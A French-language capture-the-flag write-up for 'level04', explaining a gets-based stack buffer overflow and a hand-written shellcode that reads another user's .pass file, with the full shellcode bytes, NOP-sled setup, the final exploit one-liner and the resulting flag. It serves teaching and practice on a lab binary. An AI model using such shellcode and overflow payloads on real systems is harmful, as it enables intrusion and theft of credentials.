## level04
- Examinons le [code source désassemblé](/level04/source.c) :
    - À première vue, la faille semble évidente : le binaire utilise [`gets`](https://linux.die.net/man/3/gets), qui ne vérifie pas à l'avance le nombre de caractères reçus (il est donc très facile de faire un *buffer overflow*).
    - La ligne précédente nous incite en plus à utiliser un *shellcode*. Mais contrairement au [level01](/level01/Ressources/README.md), on ne peut pas simplement lancer un `execve("/bin/sh")`. En effet, notre *shellcode* sera considéré comme un processus enfant et l'on entre donc dans la condition `else` du main. Et si notre processus enfant utilise l'appel système numéro 11 ([`execve`](http://asm.sourceforge.net/syscall.html#11)), alors le processus sera immédiatement stoppé (`kill` avec signal `SIGKILL`).
- Il nous faudra donc créer notre propre [*shellcode*](/level04/Ressources/shellcode.s), pour lire le fichier `/home/users/level05/.pass`.
    - Nous utilisons des [appels systèmes](http://shell-storm.org/shellcode/files/syscalls.html) avec la syntaxe [`int $0x80`](https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux#int_$0x80).
    - Pour obtenir les valeurs hexadécimales de notre *shellcode*, il reste à le compiler (`gcc -m32 shellcode.s -o shellcode`) et examiner le `main ` (`radare2 -AAA shellcode` puis `pdf@main`).
    - Une fois ces valeurs obtenues, nous plaçons le *shellcode* dans l'environnement : `export SHELLCODE=$(python -c 'print "\x90"*1024 + "\x6a\x73\x68\x2e\x70\x61\x73\x68\x6c\x30\x35\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\xb0\x05\x89\xe3\x31\xc9\x31\xd2\xcd\x80\x89\xc3\xb0\x03\x83\xec\x2a\x89\xe1\xb2\x2a\xcd\x80\xb0\x04\xb3\x01\x89\xe1\xb2\x2a\xcd\x80\xb0\x01\xcd\x80"')`
    - Nous retrouvons l'adresse de cette variable dans l'environnement avec `gdb` et la commande `x/10s *((char **)environ)` => `0xffffd9b0`.
    - Comme il peut y avoir une différence dans l'environnement lors de l'exécution hors de `gdb`, nous allons décaler cette adresse de 256 octets => `0xffffdab0`. Cela n'a pas d'impact sur le fonctionnement de notre *shellcode* puisque celui est précédé de 1024 octets de `nop`(https://en.wikipedia.org/wiki/NOP_(code)).
- Notre exploit est donc `python -c 'print "\x90"*156 + "\xb0\xda\xff\xff"' | ./level04`, ce qui nous permet d'obtenir le flag `3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`